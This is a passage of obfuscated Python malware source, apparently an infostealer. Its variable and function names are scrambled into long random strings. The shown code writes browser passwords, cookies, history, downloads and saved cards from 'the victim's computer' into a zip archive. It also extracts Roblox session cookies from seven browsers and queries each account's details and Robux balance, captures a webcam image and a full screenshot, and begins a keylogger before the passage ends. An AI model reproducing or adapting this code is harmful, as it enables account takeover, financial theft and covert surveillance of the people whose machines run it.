            if not os.path.exists(QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU):
                continue
            
            if "extentions" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
                try: DAKTSPFAZZDDPQJUOYTPWDUGARTRIBHAWKGTEZQSFVTJFEBMRANBOUBYXXISUFUHYDZOE(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG, WOQKZBBYGMGQIMGMCEDGNSBDIONOOLDMRRAXFABKJAYAAXBWLNDTCOIUEDWN, WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU)
                except: pass
                
            if "passwords" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
                try: ICQWSULCFMLFSNGOCDXFBKXXGXEDWCTRMXAPERZAWHDYPGBFHZQLHARXHDKLEB(WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU, JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD)
                except: pass
            if "cookies" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
                try: CZZRJSCSEASVFSLUQPIJLCNYBVACVLHOKGYBHUITCZYGDBFDRGCEHWDQ(WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU, JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD)
                except: pass
            if "history" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
                try: VSMKXVOKFVVPWGIJHFWTYGAVBYGUGWPUNSQUQMOPMYPPDLGBQJLSSSRBUWGBTXKNHEXOVBOMTALRAHRTPTLWM(WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU)
                except: pass
            if "downloads" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
                try: UGYEXMXBPPSHMFEADWCHMAJBUVMGJSBHWGPNKTNVKRHFHMCOJZQLTJXVWLNLOPGDZDRNIVJJNZTMBQ(WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU)
                except: pass
            if "cards" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
                try: CFTMQREWCMAAPOLRJVHAPWKOMUDJINKLRCRYXIYETXSXWJBGQEZQPEANIKKKVILKHMC(WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU, JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD)
                except: pass

            if WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ not in RCHQORWAAKTFWBDKUHIUABHTVBNPIKFTNDOXLOBOBITBQORZXRXESEJSCEV:
                RCHQORWAAKTFWBDKUHIUABHTVBNPIKFTNDOXLOBOBITBQORZXRXESEJSCEV.append(WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ)

    if "passwords" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
        if not XXQVIGXXXGEEIPIDPMOJAXRFYOPWFPIONLBFMFYDCJSCADPYZVYYPFENFOIDTPCGRZEMXSARBCPLG:
            XXQVIGXXXGEEIPIDPMOJAXRFYOPWFPIONLBFMFYDCJSCADPYZVYYPFENFOIDTPCGRZEMXSARBCPLG.append("No passwords was saved on the victim's computer.")
        XXQVIGXXXGEEIPIDPMOJAXRFYOPWFPIONLBFMFYDCJSCADPYZVYYPFENFOIDTPCGRZEMXSARBCPLG = "\n".join(XXQVIGXXXGEEIPIDPMOJAXRFYOPWFPIONLBFMFYDCJSCADPYZVYYPFENFOIDTPCGRZEMXSARBCPLG)
    if "cookies" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
        if not EMHRWLXBHCYNTEAWXWDCSVZAFGPWXJJTALMOYSKJLXAZWIRMEHALVOGTK:
            EMHRWLXBHCYNTEAWXWDCSVZAFGPWXJJTALMOYSKJLXAZWIRMEHALVOGTK.append("No cookies was saved on the victim's computer.")
        EMHRWLXBHCYNTEAWXWDCSVZAFGPWXJJTALMOYSKJLXAZWIRMEHALVOGTK   = "\n".join(EMHRWLXBHCYNTEAWXWDCSVZAFGPWXJJTALMOYSKJLXAZWIRMEHALVOGTK)
    if "history" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
        if not WABXLGQGDRUWYRHERXDFPXZHZONTQFBJCABCRBMEZEFCZRRIPPDWSLFURREAUCLRJNQNZVOMYEEBNAK:
            WABXLGQGDRUWYRHERXDFPXZHZONTQFBJCABCRBMEZEFCZRRIPPDWSLFURREAUCLRJNQNZVOMYEEBNAK.append("No history was saved on the victim's computer.")
        WABXLGQGDRUWYRHERXDFPXZHZONTQFBJCABCRBMEZEFCZRRIPPDWSLFURREAUCLRJNQNZVOMYEEBNAK   = "\n".join(WABXLGQGDRUWYRHERXDFPXZHZONTQFBJCABCRBMEZEFCZRRIPPDWSLFURREAUCLRJNQNZVOMYEEBNAK)
    if "downloads" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
        if not MOMXCZLZPTQVKZTCTPCAIRMJUVYOQOOQASFOXDWTNDXPUDKEZTOEAQIFQTLATNLGMBTQYOWRMVMETPIU:
            MOMXCZLZPTQVKZTCTPCAIRMJUVYOQOOQASFOXDWTNDXPUDKEZTOEAQIFQTLATNLGMBTQYOWRMVMETPIU.append("No downloads was saved on the victim's computer.")
        MOMXCZLZPTQVKZTCTPCAIRMJUVYOQOOQASFOXDWTNDXPUDKEZTOEAQIFQTLATNLGMBTQYOWRMVMETPIU = "\n".join(MOMXCZLZPTQVKZTCTPCAIRMJUVYOQOOQASFOXDWTNDXPUDKEZTOEAQIFQTLATNLGMBTQYOWRMVMETPIU)
    if "cards" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
        if not GPGHXOWATMAYHVYISHFGQTXGMKVWDPBNGBRJVWQRJTXGBKYSFHGGKDBJNNCK:
            GPGHXOWATMAYHVYISHFGQTXGMKVWDPBNGBRJVWQRJTXGBKYSFHGGKDBJNNCK.append("No cards was saved on the victim's computer.")
        GPGHXOWATMAYHVYISHFGQTXGMKVWDPBNGBRJVWQRJTXGBKYSFHGGKDBJNNCK     = "\n".join(GPGHXOWATMAYHVYISHFGQTXGMKVWDPBNGBRJVWQRJTXGBKYSFHGGKDBJNNCK)
    
    if BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN != None:
        TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.writestr(f"Passwords ({BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN}).txt", XXQVIGXXXGEEIPIDPMOJAXRFYOPWFPIONLBFMFYDCJSCADPYZVYYPFENFOIDTPCGRZEMXSARBCPLG)

    if XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE != None:
        TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.writestr(f"Cookies ({XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE}).txt", EMHRWLXBHCYNTEAWXWDCSVZAFGPWXJJTALMOYSKJLXAZWIRMEHALVOGTK)

    if LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY != None:
        TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.writestr(f"Cards ({LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY}).txt", GPGHXOWATMAYHVYISHFGQTXGMKVWDPBNGBRJVWQRJTXGBKYSFHGGKDBJNNCK)

    if WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR != None:
        TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.writestr(f"Browsing History ({WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR}).txt", WABXLGQGDRUWYRHERXDFPXZHZONTQFBJCABCRBMEZEFCZRRIPPDWSLFURREAUCLRJNQNZVOMYEEBNAK)

    if INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY != None:
        TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.writestr(f"Download History ({INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY}).txt",MOMXCZLZPTQVKZTCTPCAIRMJUVYOQOOQASFOXDWTNDXPUDKEZTOEAQIFQTLATNLGMBTQYOWRMVMETPIU)

    return AGTZIMNEBIIUMATLJGDEKDVBTAGANSFXMUQRIKWNWMKBASCCBXMIKQGFPBTQFNHVEFLCUWFOIQBWGMUIEIYVK, BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN, XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE, WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR, INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY, LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY

def IUSDIYYLVSWGXPYIXFSNQMPOOUBALVOVHPIOEEZYYICBVHFUZCERUWSYXGOXMJXOAVITZUXNPTAPHTMOUUWANTNFUKWS(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG):
    import browser_cookie3
    import requests
    import json

    OZPVTDFMGFRHCPRTWXZYQFXVWZWTOAEZOINHYOYHRBLDDUBHBATVENFAPGIWKZQJNRPAVLJNWNUGGXJP = ""
    ANCSWJFCYPXILHRWSCYHOAJWMELPJKBWQWPMKGQDFAMBFHBZOMSNCMBCJYPGJGZEKYQX = 0
    VTIJDLCYSSBJHRJKQZPHHWAYRBBKADOSPZWIHXOWZLECKCURQDBJBXIJMFLCEVJPEOFAUKRHVEFJGOXL = []
    

    def IZXDEFFVNRCKXVPCOFKQPIDPABJVYFDBHEEOOOJAJPEHCTHQOU(ESNAOVHYGZMSVONHFDJJKINAWDWPCLXQJNRJQLVHGHOTXQQZRSSVGLZTXUYKGJERGGJMRFRZLMCTJOYHPCTTFZAARTE):
        try:
            TYTGXLPHNFKEBDDDKRZDYYBFAKLQCNLHUSITZKUHZRPESEXZFOSWDUX = ESNAOVHYGZMSVONHFDJJKINAWDWPCLXQJNRJQLVHGHOTXQQZRSSVGLZTXUYKGJERGGJMRFRZLMCTJOYHPCTTFZAARTE()
            TYTGXLPHNFKEBDDDKRZDYYBFAKLQCNLHUSITZKUHZRPESEXZFOSWDUX = str(TYTGXLPHNFKEBDDDKRZDYYBFAKLQCNLHUSITZKUHZRPESEXZFOSWDUX)
            MWJKXCEWZVBZWDCHVFWJGTPNXCPQWYTHAVYRPKEIJIYGUAKPJBEWXYHFAKFMFXTBZZOUNLEANSOHBK = TYTGXLPHNFKEBDDDKRZDYYBFAKLQCNLHUSITZKUHZRPESEXZFOSWDUX.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            MOWNWPELDBBTOQJBZWNCCSVFVNHAPMWVGUUWGRXVZOSNQRXGMWBIGESVWGSOKTIZLPL = ESNAOVHYGZMSVONHFDJJKINAWDWPCLXQJNRJQLVHGHOTXQQZRSSVGLZTXUYKGJERGGJMRFRZLMCTJOYHPCTTFZAARTE.__name__
            return MWJKXCEWZVBZWDCHVFWJGTPNXCPQWYTHAVYRPKEIJIYGUAKPJBEWXYHFAKFMFXTBZZOUNLEANSOHBK, MOWNWPELDBBTOQJBZWNCCSVFVNHAPMWVGUUWGRXVZOSNQRXGMWBIGESVWGSOKTIZLPL
        except:
            return None, None

    def MicrosoftEdge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def GoogleChrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def OperaGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    DWWUYFZZEEYSSZMIRIKKYSNLVWKGYATEQMNKYBWHFJQRQNOVMKKWYEUVUXSHEJSBAGBDZPVZTCMPDJH = [MicrosoftEdge, GoogleChrome, Firefox, Opera, OperaGX, Safari, Brave]
    for v4r_br0ws3r in DWWUYFZZEEYSSZMIRIKKYSNLVWKGYATEQMNKYBWHFJQRQNOVMKKWYEUVUXSHEJSBAGBDZPVZTCMPDJH:
        v4r_c00ki3, MOWNWPELDBBTOQJBZWNCCSVFVNHAPMWVGUUWGRXVZOSNQRXGMWBIGESVWGSOKTIZLPL = IZXDEFFVNRCKXVPCOFKQPIDPABJVYFDBHEEOOOJAJPEHCTHQOU(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in VTIJDLCYSSBJHRJKQZPHHWAYRBBKADOSPZWIHXOWZLECKCURQDBJBXIJMFLCEVJPEOFAUKRHVEFJGOXL:
                ANCSWJFCYPXILHRWSCYHOAJWMELPJKBWQWPMKGQDFAMBFHBZOMSNCMBCJYPGJGZEKYQX += 1
                VTIJDLCYSSBJHRJKQZPHHWAYRBBKADOSPZWIHXOWZLECKCURQDBJBXIJMFLCEVJPEOFAUKRHVEFJGOXL.append(v4r_c00ki3)
                try:
                    EOGVGWDBGYHFAQGYMZFALIASNCEDDDQXFXXTUDWIHCMQOYFLXLLZLPCDNLH = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI = json.loads(EOGVGWDBGYHFAQGYMZFALIASNCEDDDQXFXXTUDWIHCMQOYFLXLLZLPCDNLH.text)
                except:
                    PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI = {"None": "None"}

                JFMRTOFRLEEBIWJQRKZHMXKVMOJMZHDTAOHICTSUTBEZDQKEVHAQJVEYDJTK = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('id', "None")
                BJSIACMMQIMYODVPEJWYYJSOQMNHEYXSAERAMKKFGTVYMFFXCBLPRLRRU = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('displayName', "None")
                GXDRNLXFPCSVFREGOBGBQINOKYURGGGWAJEDTPVYMADEMCEMOGGERVDQRTFYZURVIHTAYDBUPZIK = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('name', "None")
                IVOSGICOPWVOVPAPNSQUUIOJMMWZZIGHWDBVFTEESDXHOHYASG = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get("RobuxBalance", "None")
                UMTZTSSOOKIRUBOOZHMQZCAOJCMVNXUPUZRLYKNHDWHTUAGCGNDNKWKNUQMJOUPNTLXBNJRHVQJJHNFRXUEDE = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get("IsPremium", "None")
                IORPMAUXMXRYZRQFHNVJAKJXJTCAFQDGJXPWLHVNDVAQGARTBXKVXVOOKGHPIJJEUKQDPSEOKQKTAS = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get("ThumbnailUrl", "None")
                XXTIICMMMICZCJEFVOKLLLDISLFIWQJSQAWFSIUBFOYUCEBNBUTZDADIEKDYXJLJTQ = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get("IsAnyBuildersClubMember", "None")
                
                OZPVTDFMGFRHCPRTWXZYQFXVWZWTOAEZOINHYOYHRBLDDUBHBATVENFAPGIWKZQJNRPAVLJNWNUGGXJP = OZPVTDFMGFRHCPRTWXZYQFXVWZWTOAEZOINHYOYHRBLDDUBHBATVENFAPGIWKZQJNRPAVLJNWNUGGXJP + f"""
Roblox Account n°{str(ANCSWJFCYPXILHRWSCYHOAJWMELPJKBWQWPMKGQDFAMBFHBZOMSNCMBCJYPGJGZEKYQX)}:
 - Navigator     : {MOWNWPELDBBTOQJBZWNCCSVFVNHAPMWVGUUWGRXVZOSNQRXGMWBIGESVWGSOKTIZLPL}
 - Username      : {GXDRNLXFPCSVFREGOBGBQINOKYURGGGWAJEDTPVYMADEMCEMOGGERVDQRTFYZURVIHTAYDBUPZIK}
 - DisplayName   : {BJSIACMMQIMYODVPEJWYYJSOQMNHEYXSAERAMKKFGTVYMFFXCBLPRLRRU}
 - Id            : {JFMRTOFRLEEBIWJQRKZHMXKVMOJMZHDTAOHICTSUTBEZDQKEVHAQJVEYDJTK}
 - Avatar        : {IORPMAUXMXRYZRQFHNVJAKJXJTCAFQDGJXPWLHVNDVAQGARTBXKVXVOOKGHPIJJEUKQDPSEOKQKTAS}
 - Robux         : {IVOSGICOPWVOVPAPNSQUUIOJMMWZZIGHWDBVFTEESDXHOHYASG}
 - Premium       : {UMTZTSSOOKIRUBOOZHMQZCAOJCMVNXUPUZRLYKNHDWHTUAGCGNDNKWKNUQMJOUPNTLXBNJRHVQJJHNFRXUEDE}
 - Builders Club : {XXTIICMMMICZCJEFVOKLLLDISLFIWQJSQAWFSIUBFOYUCEBNBUTZDADIEKDYXJLJTQ}
 - Cookie        : {v4r_c00ki3}
"""
                
    if not VTIJDLCYSSBJHRJKQZPHHWAYRBBKADOSPZWIHXOWZLECKCURQDBJBXIJMFLCEVJPEOFAUKRHVEFJGOXL:
        OZPVTDFMGFRHCPRTWXZYQFXVWZWTOAEZOINHYOYHRBLDDUBHBATVENFAPGIWKZQJNRPAVLJNWNUGGXJP = "No roblox cookie found."
        
    TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.writestr(f"Roblox Accounts ({ANCSWJFCYPXILHRWSCYHOAJWMELPJKBWQWPMKGQDFAMBFHBZOMSNCMBCJYPGJGZEKYQX}).txt", OZPVTDFMGFRHCPRTWXZYQFXVWZWTOAEZOINHYOYHRBLDDUBHBATVENFAPGIWKZQJNRPAVLJNWNUGGXJP)

    return ANCSWJFCYPXILHRWSCYHOAJWMELPJKBWQWPMKGQDFAMBFHBZOMSNCMBCJYPGJGZEKYQX

def STBPRLBGCGNQEGNDTPGCAZHHJEDDXLRLVIINUEDYHKRZUWFEAPMWAOOXKCKBLGVCCMPOYEQFSAGI(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG):
    import cv2
    import io
    from PIL import Image

    try:
        TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture = "Yes"
        WAWJKMSGJPPNMSHAAJVGQQVECGCMWVRHFZMJHCKLHYMKSOEOCZ = cv2.VideoCapture(0)

        if not WAWJKMSGJPPNMSHAAJVGQQVECGCMWVRHFZMJHCKLHYMKSOEOCZ.isOpened():
            TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture = "No webcam found."
            return TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture

        v4r_ret, v4r_frame = WAWJKMSGJPPNMSHAAJVGQQVECGCMWVRHFZMJHCKLHYMKSOEOCZ.read()
        WAWJKMSGJPPNMSHAAJVGQQVECGCMWVRHFZMJHCKLHYMKSOEOCZ.release()

        if not v4r_ret:
            TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture = "Failed to capture image."
            HPXXWMILRRDGFNXCTSXFYPUPFONNWDEHJGFHUOUPMXVCNDLSZCWQKAAYVERVYYT()
            return TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture

        YEKOKCDNTCIBSLZZTIUEBICWIUJQVTEUORPUZHDTLYQYSTXHPWXUHQYHJZFYUHCFRXNCCFJSOVCQIELCJWWU = cv2.cvtColor(v4r_frame, cv2.COLOR_BGR2RGB)
        KIIKHYOLZBEOZLAILODSGXWCTNPRFSADSHBEEEMWYKHOLXSIJYGORYKEFGGHXWQEJVQPKQALCIPNZAXSHMK = Image.fromarray(YEKOKCDNTCIBSLZZTIUEBICWIUJQVTEUORPUZHDTLYQYSTXHPWXUHQYHJZFYUHCFRXNCCFJSOVCQIELCJWWU)
        DUETTFFNXOQSAPXSSELCTAHIJTOFEDWFQMOESGEVZJKFTFRCDQDWGMBNLBBJICFTRVGSEYRFPMJSQMRTZHBCCZRICEOW = io.BytesIO()
        KIIKHYOLZBEOZLAILODSGXWCTNPRFSADSHBEEEMWYKHOLXSIJYGORYKEFGGHXWQEJVQPKQALCIPNZAXSHMK.save(DUETTFFNXOQSAPXSSELCTAHIJTOFEDWFQMOESGEVZJKFTFRCDQDWGMBNLBBJICFTRVGSEYRFPMJSQMRTZHBCCZRICEOW, format='PNG')
        DUETTFFNXOQSAPXSSELCTAHIJTOFEDWFQMOESGEVZJKFTFRCDQDWGMBNLBBJICFTRVGSEYRFPMJSQMRTZHBCCZRICEOW.seek(0)
        TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.writestr("Webcam.png", DUETTFFNXOQSAPXSSELCTAHIJTOFEDWFQMOESGEVZJKFTFRCDQDWGMBNLBBJICFTRVGSEYRFPMJSQMRTZHBCCZRICEOW.read())

        return TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture

    except Exception as e:
        TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture = f"Error: {e}"
        return TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture

def GTPBYGSYPESNOOVUIZZLGMAHYBGBGHONMMCKMIILFOTDQFJQGORVKVLDYTOBNMHUUGQAJOOAQWTFSKFOAPR(zip_file):
    import io
    from PIL import ImageGrab

    try:
        ZTTTHKIYSZPSVFRCRFQRDHJUTKMWAWIYUNYPVJGZZWKRGYDAKIAEIHOLLACDMLCMTQGROBKCIQAS = "Yes"

        def C4ptur3():
            FNAVCEFUGAKXMMAULDPSYOTBJRTUJEHIEOJTVPIEPNWNVRHJGUVVQWKSPCCFJWFEFSTSUAIQAMWIOIFDWSMVXQUNLB = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            FNAVCEFUGAKXMMAULDPSYOTBJRTUJEHIEOJTVPIEPNWNVRHJGUVVQWKSPCCFJWFEFSTSUAIQAMWIOIFDWSMVXQUNLB_bytes = io.BytesIO()
            FNAVCEFUGAKXMMAULDPSYOTBJRTUJEHIEOJTVPIEPNWNVRHJGUVVQWKSPCCFJWFEFSTSUAIQAMWIOIFDWSMVXQUNLB.save(FNAVCEFUGAKXMMAULDPSYOTBJRTUJEHIEOJTVPIEPNWNVRHJGUVVQWKSPCCFJWFEFSTSUAIQAMWIOIFDWSMVXQUNLB_bytes, format='PNG')
            FNAVCEFUGAKXMMAULDPSYOTBJRTUJEHIEOJTVPIEPNWNVRHJGUVVQWKSPCCFJWFEFSTSUAIQAMWIOIFDWSMVXQUNLB_bytes.seek(0)
            return FNAVCEFUGAKXMMAULDPSYOTBJRTUJEHIEOJTVPIEPNWNVRHJGUVVQWKSPCCFJWFEFSTSUAIQAMWIOIFDWSMVXQUNLB_bytes

        FNAVCEFUGAKXMMAULDPSYOTBJRTUJEHIEOJTVPIEPNWNVRHJGUVVQWKSPCCFJWFEFSTSUAIQAMWIOIFDWSMVXQUNLB_bytes = C4ptur3()
        zip_file.writestr("Screenshot.png", FNAVCEFUGAKXMMAULDPSYOTBJRTUJEHIEOJTVPIEPNWNVRHJGUVVQWKSPCCFJWFEFSTSUAIQAMWIOIFDWSMVXQUNLB_bytes.read())
        return ZTTTHKIYSZPSVFRCRFQRDHJUTKMWAWIYUNYPVJGZZWKRGYDAKIAEIHOLLACDMLCMTQGROBKCIQAS
    except Exception as e:
        ZTTTHKIYSZPSVFRCRFQRDHJUTKMWAWIYUNYPVJGZZWKRGYDAKIAEIHOLLACDMLCMTQGROBKCIQAS = f"Error: {e}"
        return ZTTTHKIYSZPSVFRCRFQRDHJUTKMWAWIYUNYPVJGZZWKRGYDAKIAEIHOLLACDMLCMTQGROBKCIQAS

def NNKDCXFPYGGPFPOZRCOJTRQJGMYFWWTQEUUDEVRZUJQMIHELLFDRHGYUQQVWF():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
